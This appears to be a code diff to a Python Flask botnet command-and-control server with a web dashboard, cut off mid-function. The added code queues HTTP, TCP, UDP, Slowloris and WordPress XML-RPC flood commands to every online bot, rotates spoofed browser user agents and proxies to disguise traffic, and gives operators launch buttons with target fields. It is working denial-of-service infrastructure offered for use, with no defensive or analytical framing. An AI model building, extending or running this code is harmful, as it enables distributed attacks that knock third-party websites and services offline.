@@ -1,11 +1,24 @@
 """
-FIXED BOTNET C2 SERVER - ONLINE BOT DETECTION FIXED
-====================================================
+FIXED BOTNET C2 SERVER - ONLINE BOT DETECTION FIXED + ALL ATTACK METHODS
+=========================================================================
 FIXES:
 1. Fixed online bot detection (was checking wrong time threshold)
 2. Added proper bot heartbeat tracking
 3. Fixed /api/stats endpoint bot counting
 4. Improved last_seen timestamp updates
+5. Added HTTP GET/POST/HEAD flood methods
+6. Added TCP/UDP flood attack endpoints
+7. Added Slowloris attack support
+8. Added WordPress XML-RPC attack
+9. Added user agent management
+10. Added command system (ping, sysinfo, stop)
+
+ATTACK METHODS:
+- HTTP Flood (GET/POST/HEAD)
+- TCP Flood
+- UDP Flood
+- Slowloris (Slow HTTP)
+- WordPress XML-RPC Amplification
 """
 
 import threading
@@ -46,9 +59,10 @@ def health_check():
     """Health check endpoint for Render.com"""
     return jsonify({
         'status': 'healthy',
-        'server': 'c2-server',
+        'server': 'c2-server-fixed-with-methods',
         'time': datetime.now().isoformat(),
-        'bots_count': len(approved_bots)
+        'bots_count': len(approved_bots),
+        'online_bots': sum(1 for b in approved_bots.values() if time.time() - b.get('last_seen', 0) < ONLINE_THRESHOLD)
     })
 
 # Global storage with thread safety
@@ -56,9 +70,11 @@ approved_bots: Dict[str, Dict] = {}
 commands_queue: Dict[str, List] = {}
 attack_logs: List[Dict] = []
 user_agents: List[str] = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-    'Java-Bot-Client/1.0',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
     'JavaScript-Bot/1.0 (Node.js)',
+    'Java-Bot-Client/1.0',
     'Python-Bot/3.0'
 ]
 proxy_list: List[str] = []
@@ -72,7 +88,7 @@ DASHBOARD_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>C2 Control Panel - FIXED</title>
+    <title>C2 Control Panel - FIXED + ALL METHODS</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
@@ -211,6 +227,10 @@ DASHBOARD_HTML = """
         }
         .btn-danger { background: #d32f2f; }
         .btn-danger:hover { background: #c62828; }
+        .btn-success { background: #2e7d32; color: white; }
+        .btn-success:hover { background: #1b5e20; }
+        .btn-warning { background: #f57c00; color: white; }
+        .btn-warning:hover { background: #ef6c00; }
         .no-bots {
             text-align: center;
             padding: 30px;
@@ -230,12 +250,62 @@ DASHBOARD_HTML = """
             font-size: 0.85em;
             margin-left: 10px;
         }
+        input, select, textarea {
+            background: rgba(13, 27, 42, 0.8);
+            border: 2px solid #1976d2;
+            color: #e3f2fd;
+            padding: 12px;
+            font-family: inherit;
+            width: 100%;
+            margin: 8px 0;
+            border-radius: 6px;
+        }
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #42a5f5;
+        }
+        .form-group { margin-bottom: 18px; }
+        .form-group label { 
+            display: block; 
+            margin-bottom: 8px;
+            color: #90caf9;
+            font-weight: 500;
+        }
+        textarea { 
+            min-height: 120px; 
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+        }
+        .quick-commands {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .log {
+            max-height: 300px;
+            overflow-y: auto;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            border: 1px solid #1976d2;
+            border-radius: 6px;
+        }
+        .log-entry { 
+            margin-bottom: 8px;
+            padding: 6px;
+            border-left: 3px solid #1976d2;
+            padding-left: 10px;
+        }
+        .success { color: #66bb6a; border-left-color: #66bb6a; }
+        .error { color: #ef5350; border-left-color: #ef5350; }
+        .warning { color: #ffa726; border-left-color: #ffa726; }
+        .info { color: #42a5f5; border-left-color: #42a5f5; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>🔧 C2 CONTROL PANEL - FIXED VERSION</h1>
-        <p>Online Bot Detection Fixed | Auto-Approval | Multi-Client Support</p>
+        <h1>🔧 C2 CONTROL PANEL - FIXED + ALL METHODS</h1>
+        <p>Online Detection Fixed | Multi-Client Support | All Attack Methods</p>
         <div class="debug-info">
             Online Threshold: 60 seconds | Update Interval: 2 seconds | Current Time: <span id="current-time"></span>
         </div>
@@ -268,10 +338,114 @@ DASHBOARD_HTML = """
     </div>
 
     <div class="section">
-        <h2>📊 DEBUG INFORMATION</h2>
-        <div id="debug-info" style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 6px; font-family: monospace; font-size: 0.9em;">
-            Loading...
+        <h2>QUICK COMMANDS</h2>
+        <div class="quick-commands">
+            <button class="btn-success" onclick="sendPing()">PING ALL</button>
+            <button class="btn-warning" onclick="sendSysInfo()">SYSINFO</button>
+            <button class="btn-danger" onclick="stopAllAttacks()">STOP ALL</button>
+            <button onclick="clearInactiveBots()">CLEAR OFFLINE</button>
         </div>
+    </div>
+
+    <div class="section">
+        <h2>HTTP FLOOD ATTACK</h2>
+        <div class="form-group">
+            <label>Target URL:</label>
+            <input type="text" id="http-target" placeholder="https://example.com">
+        </div>
+        <div class="form-group">
+            <label>Threads per Bot (50-300):</label>
+            <input type="number" id="http-threads" value="100" min="50" max="300">
+        </div>
+        <div class="form-group">
+            <label>Duration (seconds):</label>
+            <input type="number" id="http-duration" value="60">
+        </div>
+        <div class="form-group">
+            <label>Method:</label>
+            <select id="http-method">
+                <option value="GET">GET</option>
+                <option value="POST">POST</option>
+                <option value="HEAD">HEAD</option>
+            </select>
+        </div>
+        <button onclick="launchHTTPFlood()" class="btn-danger">LAUNCH HTTP FLOOD</button>
+    </div>
+
+    <div class="section">
+        <h2>TCP/UDP FLOOD ATTACK</h2>
+        <div class="form-group">
+            <label>Target (host:port):</label>
+            <input type="text" id="tcp-target" placeholder="example.com:80">
+        </div>
+        <div class="form-group">
+            <label>Threads per Bot (50-200):</label>
+            <input type="number" id="tcp-threads" value="75" min="50" max="200">
+        </div>
+        <div class="form-group">
+            <label>Duration (seconds):</label>
+            <input type="number" id="tcp-duration" value="60">
+        </div>
+        <div class="form-group">
+            <label>Attack Type:</label>
+            <select id="attack-type">
+                <option value="tcp">TCP Flood</option>
+                <option value="udp">UDP Flood</option>
+            </select>
+        </div>
+        <button onclick="launchTCPUDPFlood()" class="btn-danger">LAUNCH ATTACK</button>
+    </div>
+
+    <div class="section">
+        <h2>SLOWLORIS ATTACK</h2>
+        <div class="form-group">
+            <label>Target URL:</label>
+            <input type="text" id="slowloris-target" placeholder="https://example.com">
+        </div>
+        <div class="form-group">
+            <label>Connections per Bot:</label>
+            <input type="number" id="slowloris-connections" value="200" min="50" max="500">
+        </div>
+        <div class="form-group">
+            <label>Duration (seconds):</label>
+            <input type="number" id="slowloris-duration" value="120">
+        </div>
+        <button onclick="launchSlowloris()" class="btn-danger">LAUNCH SLOWLORIS</button>
+    </div>
+
+    <div class="section">
+        <h2>WORDPRESS XML-RPC ATTACK</h2>
+        <div class="form-group">
+            <label>WordPress Site URL:</label>
+            <input type="text" id="wp-target" placeholder="https://wordpress-site.com">
+        </div>
+        <div class="form-group">
+            <label>Threads per Bot:</label>
+            <input type="number" id="wp-threads" value="50" min="10" max="100">
+        </div>
+        <div class="form-group">
+            <label>Duration (seconds):</label>
+            <input type="number" id="wp-duration" value="60">
+        </div>
+        <button onclick="launchWordPress()" class="btn-danger">LAUNCH WP ATTACK</button>
+    </div>
+
+    <div class="section">
+        <h2>MANAGE USER AGENTS</h2>
+        <div class="form-group">
+            <label>User Agents (one per line):</label>
+            <textarea id="user-agents" placeholder="Mozilla/5.0..."></textarea>
+        </div>
+        <button onclick="updateUserAgents()">UPDATE USER AGENTS</button>
+    </div>
+
+    <div class="section">
+        <h2>ACTIVITY LOGS</h2>
+        <div style="margin-bottom: 10px;">
+            <button onclick="clearLogs()">CLEAR LOGS</button>
+            <button onclick="exportLogs()">EXPORT LOGS</button>
+        </div>
+        <div id="logs" class="log"></div>
     </div>
 
     <script>
@@ -287,36 +461,18 @@ DASHBOARD_HTML = """
             fetch('/api/stats')
                 .then(r => r.json())
                 .then(data => {
-                    console.log('Stats received:', data);
-                    
-                    // Update stat boxes
                     document.getElementById('approved-bots').textContent = data.approved_bots;
                     document.getElementById('online-bots').textContent = data.online_bots;
                     document.getElementById('active-attacks').textContent = data.active_attacks;
                     document.getElementById('total-commands').textContent = data.total_commands || 0;
                     
-                    // Update debug info
-                    const debugInfo = document.getElementById('debug-info');
-                    debugInfo.innerHTML = `
-                        <strong>Server Stats:</strong><br>
-                        Total Bots: ${data.approved_bots}<br>
-                        Online Bots: ${data.online_bots}<br>
-                        Python: ${data.python_clients} | Java: ${data.java_clients} | JavaScript: ${data.javascript_clients}<br>
-                        Online Threshold: 60 seconds<br>
-                        Last Update: ${new Date().toLocaleTimeString()}<br>
-                        <br>
-                        <strong>Bot Details:</strong><br>
-                        ${data.approved.map(bot => 
-                            `${bot.bot_id}: ${bot.online ? '🟢 ONLINE' : '🔴 OFFLINE'} (last seen: ${bot.time_diff}s ago)`
-                        ).join('<br>')}
-                    `;
+                    document.getElementById('user-agents').value = data.user_agents.join('\\n');
                     
-                    // Update bot list
                     const approvedList = document.getElementById('approved-list');
                     approvedList.innerHTML = '';
                     
                     if(data.approved.length === 0) {
-                        approvedList.innerHTML = '<div class="no-bots">No bots connected. Run the client to connect.</div>';
+                        approvedList.innerHTML = '<div class="no-bots">No bots connected.</div>';
                     } else {
                         data.approved.forEach(bot => {
                             const div = document.createElement('div');
@@ -345,27 +501,166 @@ DASHBOARD_HTML = """
                             approvedList.appendChild(div);
                         });
                     }
+                    
+                    const logsDiv = document.getElementById('logs');
+                    if(data.logs.length === 0) {
+                        logsDiv.innerHTML = '<div style="text-align:center;color:#546e7a;">No activity yet</div>';
+                    } else {
+                        logsDiv.innerHTML = data.logs.slice(-30).reverse().map(log => {
+                            const logClass = log.type;
+                            return `<div class="log-entry ${logClass}">[${log.time}] ${log.message}</div>`;
+                        }).join('');
+                    }
                 })
-                .catch(err => {
-                    console.error('Error fetching stats:', err);
-                    document.getElementById('debug-info').innerHTML = 
-                        `<span style="color: #ef5350;">ERROR: ${err.message}</span>`;
-                });
+                .catch(err => console.error('Error fetching stats:', err));
+        }
+
+        function sendPing() {
+            fetch('/api/command/ping', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => { alert(data.message); updateStats(); });
+        }
+
+        function sendSysInfo() {
+            fetch('/api/command/sysinfo', { method: 'POST' })
+            .then(r => r.json())
+            .then(data => { alert(data.message); updateStats(); });
+        }
+
+        function stopAllAttacks() {
+            if(confirm('Stop all active attacks?')) {
+                fetch('/api/command/stop', { method: 'POST' })
+                .then(r => r.json())
+                .then(data => { alert(data.message); updateStats(); });
+            }
+        }
+
+        function clearInactiveBots() {
+            if(confirm('Clear all offline bots?')) {
+                fetch('/api/clear/inactive', {method: 'POST'})
+                    .then(r => r.json())
+                    .then(data => { alert(data.message); updateStats(); });
+            }
         }
 
         function removeBot(botId) {
             if(confirm('Remove bot: ' + botId + '?')) {
                 fetch('/api/remove/' + botId, {method: 'POST'})
                     .then(r => r.json())
-                    .then(data => {
-                        alert(data.message);
-                        updateStats();
-                    })
-                    .catch(err => console.error('Error:', err));
+                    .then(data => { alert(data.message); updateStats(); });
             }
         }
 
-        // Update every 2 seconds
+        function updateUserAgents() {
+            const agents = document.getElementById('user-agents').value;
+            fetch('/api/user-agents', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ user_agents: agents })
+            })
+            .then(r => r.json())
+            .then(data => { alert(data.message); updateStats(); });
+        }
+
+        function launchHTTPFlood() {
+            const target = document.getElementById('http-target').value;
+            const duration = document.getElementById('http-duration').value;
+            const threads = document.getElementById('http-threads').value;
+            const method = document.getElementById('http-method').value;
+            
+            if (!target) { alert('Please enter target URL'); return; }
+            
+            if(confirm(`Launch HTTP ${method} flood to ${target}?`)) {
+                fetch('/api/attack/http', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target, duration, threads, method })
+                })
+                .then(r => r.json())
+                .then(data => { alert(data.message); updateStats(); });
+            }
+        }
+
+        function launchTCPUDPFlood() {
+            const target = document.getElementById('tcp-target').value;
+            const duration = document.getElementById('tcp-duration').value;
+            const threads = document.getElementById('tcp-threads').value;
+            const attackType = document.getElementById('attack-type').value;
+            
+            if (!target) { alert('Please enter target'); return; }
+            
+            if(confirm(`Launch ${attackType.toUpperCase()} flood to ${target}?`)) {
+                const endpoint = attackType === 'tcp' ? '/api/attack/tcp' : '/api/attack/udp';
+                fetch(endpoint, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target, duration, threads })
+                })
+                .then(r => r.json())
+                .then(data => { alert(data.message); updateStats(); });
+            }
+        }
+
+        function launchSlowloris() {
+            const target = document.getElementById('slowloris-target').value;
+            const connections = document.getElementById('slowloris-connections').value;
+            const duration = document.getElementById('slowloris-duration').value;
+            
+            if (!target) { alert('Please enter target URL'); return; }
+            
+            if(confirm(`Launch Slowloris attack to ${target}?`)) {
+                fetch('/api/attack/slowloris', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target, connections, duration })
+                })
+                .then(r => r.json())
+                .then(data => { alert(data.message); updateStats(); });
+            }
+        }
+
+        function launchWordPress() {
+            const target = document.getElementById('wp-target').value;
+            const threads = document.getElementById('wp-threads').value;
+            const duration = document.getElementById('wp-duration').value;
+            
+            if (!target) { alert('Please enter WordPress URL'); return; }
+            
+            if(confirm(`Launch WordPress XML-RPC attack to ${target}?`)) {
+                fetch('/api/attack/wordpress', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ target, threads, duration })
+                })
+                .then(r => r.json())
+                .then(data => { alert(data.message); updateStats(); });
+            }
+        }
+
+        function clearLogs() {
+            if(confirm('Clear all logs?')) {
+                fetch('/api/logs/clear', { method: 'POST' })
+                    .then(r => r.json())
+                    .then(data => { alert(data.message); updateStats(); });
+            }
+        }
+
+        function exportLogs() {
+            fetch('/api/logs/export')
+                .then(r => r.text())
+                .then(data => {
+                    const blob = new Blob([data], { type: 'text/plain' });
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = `c2-logs-${new Date().toISOString().slice(0,10)}.txt`;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                });
+        }
+
         setInterval(updateStats, 2000);
         updateStats();
     </script>
@@ -463,7 +758,6 @@ def check_approval():
                 log_activity(log_message, 'success', client_type)
                 print(f"[+] {log_message} at {datetime.now().strftime('%H:%M:%S')}")
             else:
-                # CRITICAL FIX: Always update last_seen timestamp
                 approved_bots[bot_id]['last_seen'] = current_time
                 approved_bots[bot_id]['client_type'] = client_type
                 
@@ -487,12 +781,10 @@ def get_commands(bot_id):
         return '', 200
     
     try:
-        # CRITICAL FIX: Update last_seen when bot checks for commands
         current_time = time.time()
         with bot_lock:
             if bot_id in approved_bots:
                 approved_bots[bot_id]['last_seen'] = current_time
-                print(f"[*] Bot {bot_id} checked for commands at {datetime.now().strftime('%H:%M:%S')}")
         
         with queue_lock:
             commands = commands_queue.get(bot_id, [])
@@ -523,7 +815,6 @@ def receive_status():
         status = data.get('status', 'unknown')
         message = data.get('message', '')
         
-        # CRITICAL FIX: Update last_seen when receiving status
         current_time = time.time()
         with bot_lock:
             if bot_id in approved_bots:
@@ -536,8 +827,6 @@ def receive_status():
         client_type = approved_bots.get(bot_id, {}).get('client_type', 'unknown')
         log_message = f"{bot_id} ({client_type}): {status} - {message}"
         log_activity(log_message, status, client_type)
-        
-        print(f"[*] Status from {bot_id} ({client_type}): {status}")
         
         return jsonify({'status': 'ok'})
     except Exception as e:
@@ -574,7 +863,43 @@ def remove_bot(bot_id):
         print(f"[!] {error_msg}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
-# CRITICAL FIX: Completely rewritten get_stats() with proper online detection
+@app.route('/api/clear/inactive', methods=['POST', 'OPTIONS'])
+def clear_inactive_bots():
+    """Clear inactive bots"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        current_time = time.time()
+        removed_count = 0
+        
+        with bot_lock:
+            bots_to_remove = []
+            for bot_id, info in list(approved_bots.items()):
+                try:
+                    last_seen = info.get('last_seen', 0)
+                    time_diff = current_time - last_seen
+                    if time_diff > CLEANUP_THRESHOLD:
+                        bots_to_remove.append(bot_id)
+                except:
+                    continue
+            
+            for bot_id in bots_to_remove:
+                del approved_bots[bot_id]
+                
+                with queue_lock:
+                    if bot_id in commands_queue:
+                        del commands_queue[bot_id]
+                
+                removed_count += 1
+        
+        return jsonify({'status': 'success', 'message': f'Removed {removed_count} inactive bots'})
+    except Exception as e:
+        error_msg = f'Error in clear_inactive_bots: {str(e)}'
+        log_activity(error_msg, 'error')
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 @app.route('/api/stats', methods=['GET', 'OPTIONS'])
 def get_stats():
     """Get server statistics - FIXED ONLINE DETECTION"""
@@ -598,14 +923,12 @@ def get_stats():
                     last_seen = info.get('last_seen', 0)
                     time_diff = current_time - last_seen
                     
-                    # CRITICAL FIX: Use ONLINE_THRESHOLD (60 seconds)
                     is_online = time_diff < ONLINE_THRESHOLD
                     
                     client_type = info.get('client_type', 'unknown')
                     status = info.get('status', 'unknown')
                     specs = info.get('specs', {})
                     
-                    # Count online bots
                     if is_online:
                         online_bots += 1
                         
@@ -621,11 +944,9 @@ def get_stats():
                         
                         total_commands += info.get('commands_received', 0)
                     else:
-                        # Mark as offline if exceeds threshold
                         if info.get('status') != 'offline':
                             info['status'] = 'offline'
                     
-                    # Prepare bot for display
                     approved_list.append({
                         'bot_id': bot_id,
                         'specs': {
@@ -639,10 +960,6 @@ def get_stats():
                         'client_type': client_type,
                         'time_diff': int(time_diff)
                     })
-                    
-                    # Debug logging
-                    if time_diff < ONLINE_THRESHOLD:
-                        print(f"[DEBUG] Bot {bot_id}: ONLINE (last seen {int(time_diff)}s ago)")
                     
                 except Exception as e:
                     print(f"[!] Error processing bot {bot_id}: {e}")
@@ -666,15 +983,12 @@ def get_stats():
             'proxies': proxy_list
         }
         
-        print(f"[DEBUG] Stats: {online_bots}/{len(approved_bots)} online, threshold={ONLINE_THRESHOLD}s")
-        
         return jsonify(result)
         
     except Exception as e:
         error_msg = f'Error in get_stats: {str(e)}'
         log_activity(error_msg, 'error')
         print(f"[!] {error_msg}")
-        print(f"[!] Traceback: {traceback.format_exc()}")
         return jsonify({
             'approved_bots': 0,
             'online_bots': 0,
@@ -690,6 +1004,427 @@ def get_stats():
             'proxies': []
         }), 500
 
+def get_online_bots():
+    """Get list of online bot IDs"""
+    current_time = time.time()
+    online_bots = []
+    
+    with bot_lock:
+        for bot_id, info in approved_bots.items():
+            try:
+                last_seen = info.get('last_seen', 0)
+                if current_time - last_seen < ONLINE_THRESHOLD:
+                    online_bots.append(bot_id)
+            except:
+                continue
+    
+    return online_bots
+
+@app.route('/api/user-agents', methods=['GET', 'POST', 'OPTIONS'])
+def manage_user_agents():
+    """Manage user agents"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    global user_agents
+    
+    try:
+        if request.method == 'POST':
+            data = request.json
+            agents_text = data.get('user_agents', '')
+            new_agents = [line.strip() for line in agents_text.split('\n') if line.strip()]
+            
+            if new_agents:
+                user_agents = new_agents
+                log_activity(f'Updated {len(user_agents)} user agents', 'info')
+                print(f"[+] Updated {len(user_agents)} user agents")
+                return jsonify({'status': 'success', 'message': f'Updated {len(user_agents)} user agents'})
+            
+            return jsonify({'status': 'error', 'message': 'No valid user agents provided'}), 400
+        
+        return jsonify({'user_agents': user_agents})
+    except Exception as e:
+        error_msg = f'Error in manage_user_agents: {str(e)}'
+        log_activity(error_msg, 'error')
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/attack/http', methods=['POST', 'OPTIONS'])
+def launch_http_attack():
+    """Launch HTTP flood attack"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        data = request.json
+        
+        target = data.get('target')
+        duration = int(data.get('duration', 60))
+        threads = int(data.get('threads', 100))
+        method = data.get('method', 'GET')
+        
+        if not target:
+            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
+        
+        target_bots = get_online_bots()
+        
+        if not target_bots:
+            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
+        
+        sent_count = 0
+        
+        with queue_lock:
+            for bot_id in target_bots:
+                command = {
+                    'type': 'http_flood',
+                    'target': target,
+                    'duration': duration,
+                    'threads': threads,
+                    'method': method,
+                    'user_agents': user_agents,
+                    'proxies': proxy_list
+                }
+                
+                if bot_id not in commands_queue:
+                    commands_queue[bot_id] = []
+                commands_queue[bot_id].append(command)
+                sent_count += 1
+        
+        log_message = f'HTTP {method} flood to {sent_count} bots -> {target} ({threads} threads)'
+        log_activity(log_message, 'warning')
+        
+        print(f"[+] {log_message}")
+        return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} bots', 'sent_count': sent_count})
+    except Exception as e:
+        error_msg = f'Error in launch_http_attack: {str(e)}'
+        log_activity(error_msg, 'error')
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/attack/tcp', methods=['POST', 'OPTIONS'])
+def launch_tcp_attack():
+    """Launch TCP flood attack"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        data = request.json
+        
+        target = data.get('target')
+        duration = int(data.get('duration', 60))
+        threads = int(data.get('threads', 75))
+        
+        if not target:
+            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
+        
+        target_bots = get_online_bots()
+        
+        if not target_bots:
+            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
+        
+        sent_count = 0
+        
+        with queue_lock:
+            for bot_id in target_bots:
+                command = {
+                    'type': 'tcp_flood',
+                    'target': target,
+                    'duration': duration,
+                    'threads': threads
+                }
+                
+                if bot_id not in commands_queue:
+                    commands_queue[bot_id] = []
+                commands_queue[bot_id].append(command)
+                sent_count += 1
+        
+        log_message = f'TCP flood to {sent_count} bots -> {target} ({threads} threads)'
+        log_activity(log_message, 'warning')
+        
+        print(f"[+] {log_message}")
+        return jsonify({'status': 'success', 'message': f'TCP flood sent to {sent_count} bots', 'sent_count': sent_count})
+    except Exception as e:
+        error_msg = f'Error in launch_tcp_attack: {str(e)}'
+        log_activity(error_msg, 'error')
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/attack/udp', methods=['POST', 'OPTIONS'])
+def launch_udp_attack():
+    """Launch UDP flood attack"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        data = request.json
+        
+        target = data.get('target')
+        duration = int(data.get('duration', 60))
+        threads = int(data.get('threads', 75))
+        
+        if not target:
+            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
+        
+        target_bots = get_online_bots()
+        
+        if not target_bots:
+            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
+        
+        sent_count = 0
+        
+        with queue_lock:
+            for bot_id in target_bots:
+                command = {
+                    'type': 'udp_flood',
+                    'target': target,
+                    'duration': duration,
+                    'threads': threads
+                }
+                
+                if bot_id not in commands_queue:
+                    commands_queue[bot_id] = []
+                commands_queue[bot_id].append(command)
+                sent_count += 1
+        
+        log_message = f'UDP flood to {sent_count} bots -> {target} ({threads} threads)'
+        log_activity(log_message, 'warning')
+        
+        print(f"[+] {log_message}")
+        return jsonify({'status': 'success', 'message': f'UDP flood sent to {sent_count} bots', 'sent_count': sent_count})
+    except Exception as e:
+        error_msg = f'Error in launch_udp_attack: {str(e)}'
+        log_activity(error_msg, 'error')
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/attack/slowloris', methods=['POST', 'OPTIONS'])
+def launch_slowloris_attack():
+    """Launch Slowloris attack"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        data = request.json
+        
+        target = data.get('target')
+        connections = int(data.get('connections', 200))
+        duration = int(data.get('duration', 120))
+        
+        if not target:
+            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
+        
+        target_bots = get_online_bots()
+        
+        if not target_bots:
+            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
+        
+        sent_count = 0
+        
+        with queue_lock:
+            for bot_id in target_bots:
+                command = {
+                    'type': 'slowloris',
+                    'target': target,
+                    'connections': connections,
+                    'duration': duration
+                }
+                
+                if bot_id not in commands_queue:
+                    commands_queue[bot_id] = []
+                commands_queue[bot_id].append(command)
+                sent_count += 1
+        
+        log_message = f'Slowloris attack to {sent_count} bots -> {target} ({connections} connections)'
+        log_activity(log_message, 'warning')
+        
+        print(f"[+] {log_message}")
+        return jsonify({'status': 'success', 'message': f'Slowloris sent to {sent_count} bots', 'sent_count': sent_count})
+    except Exception as e:
+        error_msg = f'Error in launch_slowloris_attack: {str(e)}'
+        log_activity(error_msg, 'error')
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/attack/wordpress', methods=['POST', 'OPTIONS'])
+def launch_wordpress_attack():
+    """Launch WordPress XML-RPC attack"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        data = request.json
+        
+        target = data.get('target')
+        threads = int(data.get('threads', 50))
+        duration = int(data.get('duration', 60))
+        
+        if not target:
+            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
+        
+        target_bots = get_online_bots()
+        
+        if not target_bots:
+            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
+        
+        sent_count = 0
+        
+        with queue_lock:
+            for bot_id in target_bots:
+                command = {
+                    'type': 'wordpress_xmlrpc',
+                    'target': target,
+                    'threads': threads,
+                    'duration': duration
+                }
+                
+                if bot_id not in commands_queue:
+                    commands_queue[bot_id] = []
+                commands_queue[bot_id].append(command)
+                sent_count += 1
+        
+        log_message = f'WordPress XML-RPC attack to {sent_count} bots -> {target} ({threads} threads)'
+        log_activity(log_message, 'warning')
+        
+        print(f"[+] {log_message}")
+        return jsonify({'status': 'success', 'message': f'WordPress attack sent to {sent_count} bots', 'sent_count': sent_count})
+    except Exception as e:
+        error_msg = f'Error in launch_wordpress_attack: {str(e)}'
+        log_activity(error_msg, 'error')
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/command/ping', methods=['POST', 'OPTIONS'])
+def send_ping():
+    """Send ping to bots"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        target_bots = get_online_bots()
+        
+        if not target_bots:
+            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
+        
+        sent_count = 0
+        
+        with queue_lock:
+            for bot_id in target_bots:
+                command = {'type': 'ping'}
+                
+                if bot_id not in commands_queue:
+                    commands_queue[bot_id] = []
+                commands_queue[bot_id].append(command)
+                sent_count += 1
+        
+        log_activity(f'Ping sent to {sent_count} bots', 'success')
+        print(f"[+] Ping sent to {sent_count} bots")
+        return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} bots', 'sent_count': sent_count})
+    except Exception as e:
+        error_msg = f'Error in send_ping: {str(e)}'
+        log_activity(error_msg, 'error')
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/command/sysinfo', methods=['POST', 'OPTIONS'])
+def send_sysinfo():
+    """Request system info from bots"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        target_bots = get_online_bots()
+        
+        if not target_bots:
+            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
+        
+        sent_count = 0
+        
+        with queue_lock:
+            for bot_id in target_bots:
+                command = {'type': 'sysinfo'}
+                
+                if bot_id not in commands_queue:
+                    commands_queue[bot_id] = []
+                commands_queue[bot_id].append(command)
+                sent_count += 1
+        
+        log_activity(f'Sysinfo request sent to {sent_count} bots', 'success')
+        print(f"[+] Sysinfo sent to {sent_count} bots")
+        return jsonify({'status': 'success', 'message': f'Sysinfo request sent to {sent_count} bots', 'sent_count': sent_count})
+    except Exception as e:
+        error_msg = f'Error in send_sysinfo: {str(e)}'
+        log_activity(error_msg, 'error')
+        print(f"[!] {error_msg}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@app.route('/api/command/stop', methods=['POST', 'OPTIONS'])
+def send_stop_all():
+    """Stop all attacks on bots"""
+    if request.method == 'OPTIONS':
+        return '', 200
+    
+    try:
+        target_bots = get_online_bots()
+        
+        if not target_bots:
+            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
+        
+        sent_count = 0
+        
+        with queue_lock:
+            for bot_id in target_bots:
+                command = {'type': 'stop_all'}
+                
+                if bot_id not in commands_queue:
+                    commands_queue[bot_id] = []
+                commands_queue[bot_id].append(command)
+                sent_count += 1
+        
+        log_activity(f'Stop all attacks command sent to {sent_count} bots', 'error')
+        print(f"[+] Stop command sent to {sent_count} bots")
+        return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} bots', 'sent_count': sent_count})
+    except Exception as e:
+        error_msg = f'Error in send_stop_all: {str(e)}'
+        log_activity(error_msg, 'error')
